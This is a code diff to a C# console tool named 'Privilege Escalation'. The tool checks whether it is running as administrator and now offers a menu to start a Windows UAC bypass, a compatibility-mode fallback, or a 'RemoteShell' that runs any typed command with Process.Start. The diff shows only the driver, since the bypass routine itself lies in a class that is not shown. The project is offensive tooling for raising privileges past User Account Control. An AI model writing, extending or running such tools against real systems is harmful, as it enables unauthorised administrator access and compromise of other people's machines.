@@ -3,9 +3,6 @@ using System.Diagnostics;
 
 namespace Privilege_Escalation
 {
-    /// <summary>
-    ///     This project has been made by Tesla Night for Mrakovic-ORG
-    /// </summary>
     internal static class Program
     {
         private static void Main()
@@ -13,20 +10,31 @@ namespace Privilege_Escalation
             Console.Clear();
             Console.Title = "Privilege Escalation";
 
+            Console.WriteLine("Using: " + UAC.GetWindowsName());
+
             //This part will return if current process is elevated
             var isUAC = UAC.IsRunningAsLocalAdmin() ? "Yes" : "No";
-            Console.WriteLine("UAC: " + isUAC);
+            Console.WriteLine($"UAC: {isUAC}");
 
-            //If isn't already elevated start the bypass
-            if (!UAC.IsRunningAsLocalAdmin()) UAC.Start();
-
-            //Quickly done a remote shell, sorry for garbage code :p
-            Console.WriteLine("Press enter to start a Remote Shell !");
-            while (Console.ReadKey().Key == ConsoleKey.Enter) RemoteShell();
+            //If you run into trouble please use failsafe in compatibility mode
+            Console.WriteLine("Numpad 1: Start UAC Bypass\nNumpad 2: RemoteShell\nNumpad 3: Compatibility mode");
+            switch (Console.ReadKey().Key)
+            {
+                case ConsoleKey.NumPad1:
+                    UAC.Start();
+                    break;
+                case ConsoleKey.NumPad2:
+                    RemoteShell();
+                    break;
+                case ConsoleKey.NumPad3:
+                    UAC.Compatibility();
+                    break;
+            }
         }
 
         private static void RemoteShell()
         {
+            Console.Write("\b");
             Console.WriteLine("Shell: ");
             var input = Console.ReadLine();
             if (input != null) Process.Start(input);
